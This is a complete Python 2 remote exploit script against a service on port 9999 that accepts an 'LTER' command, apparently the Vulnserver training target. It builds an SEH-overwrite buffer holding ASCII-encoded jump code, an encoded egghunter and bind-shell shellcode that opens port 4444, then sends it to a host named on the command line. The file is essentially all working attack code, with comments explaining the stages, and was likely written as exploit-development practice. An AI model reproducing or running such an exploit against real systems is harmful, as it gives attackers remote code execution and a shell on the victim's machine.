#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    sys.exit('Usage: %s IP' % sys.argv[0])

nSEH = "\x42\x42\x73\xff"
SEH=   "\x0b\x12\x50\x62"

#Set ESP above our nSEH using ECX as a starting point. Then ASCII encode ADD ECX, 48A; JMP ECX. This will land us
#Above Setup.
Stage2 = ( #110 bytes
"\x51"
"\x58"
"\x2d\x7f\x7f\x7f\x7f"
"\x2d\x1f\x01\x1f\x1f"
"\x2d\x1e\x6d\x61\x61"
"\x54"
"\x5B"
"\x50"
"\x5C"
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x70\x6f\x6f\x6f"
"\x50"
"\x2d\x7f\x7f\x7f\x7f"
"\x2d\x11\x11\x12\x2f"
"\x50"
"\x2d\x2f\x2f\x2f\x7f"
"\x2d\x50\x0f\x45\x5E"
"\x50"
+
"\x42"*61
)

Setup = ( #Set ESP above Stage2. This will allow us to push our egghunter in place.
"A"*50 +
"\x54"
"\x58"
"\x2d\x7f\x7f\x7f\x7f"
"\x2d\x7f\x7f\x7f\x7f"
"\x2d\x7a\x01\x01\x01"
"\x50"
"\x5c"
)

#ASCII encoded NTAlarm 32 bit egghunter
EggHunter = ("\x41" * 4 +
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x55\x55\x55\x55"
"\x2d\x01\x55\x55\x60"
"\x2d\x35\x6e\x55\x62"
"\x50"
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x55\x55\x55\x55"
"\x2d\x7e\x01\x55\x7f"
"\x2d\x7e\x33\x6b\x7b"
"\x50" 
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x01\x55\x7f\x55"
"\x2d\x7a\x01\x7f\x55"
"\x2d\x55\x35\x76\x5a"
"\x50" 
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x55\x7f\x7f\x55"
"\x2d\x55\x7f\x01\x55"
"\x2d\x67\x48\x0c\x25"
"\x50"
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x7f\x55\x7f\x7f"
"\x2d\x42\x55\x20\x01"
"\x2d\x03\x50\x06\x0b"
"\x50" 
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x7f\x39\x01\x62"
"\x2d\x53\x06\x05\x5f"
"\x2d\x2c\x68\x2c\x10"
"\x50" 
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x7f\x7f\x01\x01"
"\x2d\x30\x05\x5f\x4e"
"\x2d\x42\x39\x4d\x46"
"\x50" 
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x7f\x7c\x7f\x55"
"\x2d\x1a\x01\x55\x55"
"\x2d\x01\x01\x61\x55"
"\x50" 
+
"A"*19
)

#Bind 4444
Shellcode = ("r00tr00t"+
"\xb8\x1a\xe7\xb0\x0b\xd9\xcb\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x53\x31\x43\x12\x83\xc3\x04\x03\x59\xe9\x52\xfe\xa1\x1d\x10"
"\x01\x59\xde\x75\x8b\xbc\xef\xb5\xef\xb5\x40\x06\x7b\x9b\x6c"
"\xed\x29\x0f\xe6\x83\xe5\x20\x4f\x29\xd0\x0f\x50\x02\x20\x0e"
"\xd2\x59\x75\xf0\xeb\x91\x88\xf1\x2c\xcf\x61\xa3\xe5\x9b\xd4"
"\x53\x81\xd6\xe4\xd8\xd9\xf7\x6c\x3d\xa9\xf6\x5d\x90\xa1\xa0"
"\x7d\x13\x65\xd9\x37\x0b\x6a\xe4\x8e\xa0\x58\x92\x10\x60\x91"
"\x5b\xbe\x4d\x1d\xae\xbe\x8a\x9a\x51\xb5\xe2\xd8\xec\xce\x31"
"\xa2\x2a\x5a\xa1\x04\xb8\xfc\x0d\xb4\x6d\x9a\xc6\xba\xda\xe8"
"\x80\xde\xdd\x3d\xbb\xdb\x56\xc0\x6b\x6a\x2c\xe7\xaf\x36\xf6"
"\x86\xf6\x92\x59\xb6\xe8\x7c\x05\x12\x63\x90\x52\x2f\x2e\xfd"
"\x97\x02\xd0\xfd\xbf\x15\xa3\xcf\x60\x8e\x2b\x7c\xe8\x08\xac"
"\x83\xc3\xed\x22\x7a\xec\x0d\x6b\xb9\xb8\x5d\x03\x68\xc1\x35"
"\xd3\x95\x14\xa3\xdb\x30\xc7\xd6\x26\x82\xb7\x56\x88\x6b\xd2"
"\x58\xf7\x8c\xdd\xb2\x90\x25\x20\x3d\x8f\xe9\xad\xdb\xc5\x01"
"\xf8\x74\x71\xe0\xdf\x4c\xe6\x1b\x0a\xe5\x80\x54\x5c\x32\xaf"
"\x64\x4a\x14\x27\xef\x99\xa0\x56\xf0\xb7\x80\x0f\x67\x4d\x41"
"\x62\x19\x52\x48\x14\xba\xc1\x17\xe4\xb5\xf9\x8f\xb3\x92\xcc"
"\xd9\x51\x0f\x76\x70\x47\xd2\xee\xbb\xc3\x09\xd3\x42\xca\xdc"
"\x6f\x61\xdc\x18\x6f\x2d\x88\xf4\x26\xfb\x66\xb3\x90\x4d\xd0"
"\x6d\x4e\x04\xb4\xe8\xbc\x97\xc2\xf4\xe8\x61\x2a\x44\x45\x34"
"\x55\x69\x01\xb0\x2e\x97\xb1\x3f\xe5\x13\xc1\x75\xa7\x32\x4a"
"\xd0\x32\x07\x17\xe3\xe9\x44\x2e\x60\x1b\x35\xd5\x78\x6e\x30"
"\x91\x3e\x83\x48\x8a\xaa\xa3\xff\xab\xfe"
)

crash = "LTER ."
buffer = crash + Setup + EggHunter + "B" * 3098 +  Stage2 + nSEH + SEH  + "A"*98 + Shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 9999))
response = s.recv(1024)
print response
s.send(buffer)
s.close()

